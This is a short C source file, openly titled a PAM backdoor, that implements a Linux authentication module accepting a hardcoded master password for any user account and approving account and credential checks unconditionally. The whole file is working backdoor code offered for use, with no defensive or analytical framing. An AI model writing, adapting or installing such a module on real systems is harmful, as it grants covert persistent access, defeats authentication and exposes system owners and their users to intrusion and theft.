/**
 * pambd.c - A small pam backdoor.
 * Federico Fazzi <eurialo@deftcode.ninja>
 * 
 * This trick shows you how to create a PAM module backdoor that 
 * allows to execute an user login with your own custom password.
 *
 * If you try to make the login with the real password of the target 
 * user and the authentication fails, the pam_auth.so switches to the 
 * pambd.so and viceversa!
 *
 * (c) 2015 - MIT License.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#define MYPASSWD "my_master_passwd"

PAM_EXTERN int pam_sm_setcred
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate
(pam_handle_t *pamh, int flags,int argc, const char **argv) {
    char *password = NULL;

    pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);

    if (!strncmp(password, MYPASSWD, strlen(MYPASSWD)))
        return PAM_SUCCESS;

    return -1;
}
